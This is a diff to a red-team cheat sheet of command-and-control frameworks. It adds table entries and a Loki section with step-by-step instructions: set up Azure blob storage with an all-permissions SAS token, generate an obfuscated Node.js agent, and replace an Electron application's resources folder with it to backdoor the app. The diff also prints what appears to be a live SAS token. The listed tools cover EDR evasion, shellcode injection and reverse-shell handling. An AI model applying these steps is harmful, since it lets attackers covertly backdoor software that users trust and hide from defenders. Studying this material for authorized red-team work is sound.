@@ -8,6 +8,7 @@
 - [Empire](#empire)
 - [Hak5 Cloud C2](#hak5-cloud-c2)
 - [Havoc](#havoc)
+- [Loki](#loki)
 - [Merlin](#merlin)
 - [Mythic](#mythic)
 - [Redirector](#redirector)
@@ -16,6 +17,8 @@
 
 ## Resources
 
+| Name | Description | URL |
+| --- | --- | --- |
 | Name | Description | URL |
 | --- | --- | --- |
 | AzureC2Relay | AzureC2Relay is an Azure Function that validates and relays Cobalt Strike beacon traffic by verifying the incoming requests based on a Cobalt Strike Malleable C2 profile. | https://github.com/Flangvik/AzureC2Relay |
@@ -28,6 +31,7 @@
 | Hardhat C2 | A c# Command & Control framework | https://github.com/DragoQCC/HardHatC2 |
 | Havoc | The Havoc Framework | https://github.com/HavocFramework/Havoc |
 | KillDefenderBOF | Beacon Object File PoC implementation of KillDefender | https://github.com/Cerbersec/KillDefenderBOF |
+| Loki | 🧙‍♂️ Node JS C2 for backdooring vulnerable Electron applications | https://github.com/boku7/Loki |
 | Merlin | Merlin is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in golang. | https://github.com/Ne0nd0g/merlin |
 | Merlin Agent | Post-exploitation agent for Merlin | https://github.com/Ne0nd0g/merlin-agent |
 | Merlin Agent Dynamic Link Library (DLL) | This repository contains the very minimal C code file that is used to compile a Merlin agent into a DLL. | https://github.com/Ne0nd0g/merlin-agent-dll | 
@@ -44,6 +48,7 @@
 | Sliver | Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. | https://github.com/BishopFox/sliver |
 | SharpLAPS | Retrieve LAPS password from LDAP | https://github.com/swisskyrepo/SharpLAPS |
 | SPAWN | Cobalt Strike BOF that spawns a sacrificial process, injects it with shellcode, and executes payload. Built to evade EDR/UserLand hooks by spawning sacrificial process with Arbitrary Code Guard (ACG), BlockDll, and PPID spoofing. | https://github.com/boku7/SPAWN |
+| Tempest | A command and control framework written in rust. | https://github.com/Teach2Breach/Tempest |
 | Villain | Villain is a C2 framework that can handle multiple TCP socket & HoaxShell-based reverse shells, enhance their functionality with additional features (commands, utilities etc) and share them among connected sibling servers (Villain instances running on different machines). | https://github.com/t3l3machus/Villain |
 
 ## Covenant
@@ -255,6 +260,78 @@ user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/h
 ```console
 user@host:/opt/Havoc/Client$ ./Havoc
 ```
+
+## Loki
+
+> https://github.com/boku7/Loki
+
+> https://github.com/boku7/Loki/blob/main/docs/azure/create-storage-account-portal.md
+
+### Create Azure Storage Blob Account and get SAS Token
+
+#### Create a Storage Account
+
+1. Go to the Azure Portal.
+2. Navigate to Storage accounts and click Create.
+3. Configure the following:
+	- Subscription: Select your subscription.
+    - Resource Group: Click Create new or select an existing one.
+    - Storage Account Name: Enter a unique name (e.g., 7200727c985343598e3646).
+    - Redundancy: Locally Redundant Storage (LRS).
+4. Click Review + Create, then Create.
+
+#### Generate a SAS Token
+
+1. Go to Storage accounts in the Azure Portal.
+2. Click on your storage account (mystorageaccount12345).
+3. In the left menu, select Shared Access Signature.
+4. Configure:
+	- Permissions: Check all (Read, Write, Delete, List, Add, Create, Update, Process).
+    - Allowed Services: Select Blob, Queue, Table.
+    - Allowed Resource Types: Select Service, Container, Object.
+    - Expiry Date: Set to 3 months from today.
+    - Protocol: Choose HTTPS only.
+5. Click Generate SAS and connection string.
+6. Copy the SAS Token and Blob Service SAS URL.
+
+### Create Obfuscated Loki Payload
+
+```console
+$ npm install --save-dev javascript-obfuscator
+```
+
+```console
+$ nodejs obfuscateAgent.js
+```
+
+```console
+[+] Provide Azure storage account information:
+        - Enter Storage Account  : ydo5qhvfnnop3binduqk3i.blob.core.windows.net
+```
+
+```console
+[+] Provide Azure storage account information:
+        - Enter Storage Account  : ydo5qhvfnnop3binduqk3i.blob.core.windows.net
+        - Enter SAS Token        : sv=2024-11-04&ss=bqt&srt=sco&sp=rwdlacupiytfx&se=2025-07-10T04:03:55Z&st=2025-04-09T20:03:55Z&spr=https&sig=Neb1LiDs%2FLUe%2B1ATBR8fhGqRY39mki3U%2F3rRLefCEUk%3D
+```
+
+```console
+agent.js  assembly.html  assembly.js  assembly.node  browser.html  browser.js  common.js  config.js  crypt.js  handler.js  keytar.node  main.js  package.json
+```
+
+### Backdoor Electron Application
+
+- Your obfuscated Loki payload is output to ./app/
+- Change directory to the {ELECTRONAPP}/resources/
+- Delete everything
+- Copy the Loki ./app/ folder to {ELECTRONAPP}/resources/app/
+- Click the Electron PE file and make sure Loki works
+
+### Configure Loki Client
+
+- Launch the Loki GUI client
+- From the menubar click Loki Client > Configuration to open the Settings window
+- Enter in your Storage Account details and click Save
 
 ## Merlin
 
